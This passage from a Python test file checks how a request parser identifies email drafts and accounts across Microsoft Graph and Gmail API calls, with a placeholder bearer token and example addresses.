            "PATCH",
            f"{M}/messages/{long_id}",
            {"subject": "y"},
            auth=("authorization", "Bearer eyOTHER.graph.token"),
        )
    )
    assert other_token.draft == patch.draft and other_token.account != patch.account
    send = read(_graph("POST", f"{M}/messages/{long_id}/send"))
    assert send.draft == patch.draft
    elsewhere = read(_graph("PATCH", f"/v1.0/users/ana@example.com/messages/{long_id}",
                            {"subject": "y"}))  # fmt: skip
    assert elsewhere.draft is not None and elsewhere.draft != patch.draft
    short = read(_graph("PATCH", f"{M}/messages/AAMk1", {"subject": "y"}))
    assert short.draft is not None and short.draft != patch.draft


def test_a_gmail_draft_is_the_same_by_its_send_and_its_update() -> None:
    send = read(_gmail("POST", f"{G}/drafts/send", {"id": "r-42"}))
    update = read(_gmail("PUT", f"{G}/drafts/r-42", {"message": {"raw": "eA"}}))
    assert send.draft is not None and send.draft == update.draft
    assert read(_gmail("PUT", f"{G}/drafts/r-43", {"message": {"raw": "eA"}})).draft != send.draft
